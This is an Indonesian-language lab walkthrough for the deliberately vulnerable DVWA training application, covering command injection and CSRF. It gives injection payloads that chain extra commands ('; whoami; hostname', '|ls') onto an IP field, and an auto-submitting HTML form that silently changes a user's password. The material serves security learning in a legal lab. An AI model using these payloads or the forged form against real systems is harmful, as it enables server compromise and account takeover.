# DVWA Tricks
Damn Vulnerable Web Application (DVWA) adalah aplikasi web berbasis PHP/MySQL yang sangat rentan. Tujuan utamanya adalah untuk menjadi bantuan bagi para profesional keamanan untuk menguji skill dan tools di lingkungan yang legal, membantu developer web lebih memahami proses mengamankan aplikasi web dan membantu siswa & guru untuk belajar tentang keamanan aplikasi web di platform yang sudah disediakan.

Informasi Download dan instalasi: https://github.com/digininja/DVWA

## Command Injection
Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan penyerang dapat mengeksekusi perintah sistem operasi (OS) sewenang-wenang di server yang menjalankan aplikasi, dan biasanya membahayakan aplikasi dan semua data.

### Security Low
```sh
127.0.0.1; ls
``` 
![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%201.JPG)

```sh
127.0.0.1; whoami; hostname
```
![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%202.JPG)

### Security Medium
```sh
127.0.0.1& ls
```
```sh
127.0.0.1& whoami& hostname
```

### Security Hard
Di level ini kita hanya bisa mengeksekusi 1 perintah saja
```sh
127.0.0.1|ls
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%203.JPG)

## CSRF
Cross-site request forgery atau Pemalsuan permintaan lintas situs adalah celah keamanan web yang memungkinkan penyerang membujuk pengguna untuk melakukan tindakan yang tidak ingin mereka lakukan.

### Security Low
Mengganti password pengguna menjadi **test** lewat link
```sh
http://<IP>/DVWA/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change
```

Mengganti password pengguna menjadi **test123** lewat halaman palsu (phising). Silahkan Edit dan simpan kode dibawah ini dengan **nama_file.html**
```sh
<html>
    <body>
        <form action="http://<IP>/DVWA/vulnerabilities/csrf" method="GET">
            <input type="hidden" name="password_new" value="test123" />
            <input type="hidden" name="password_conf" value="test123" />
            <input type="hidden" name="Change" value="Change" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%204.JPG)

### Security Medium


Referensi: https://portswigger.net/web-security/learning-path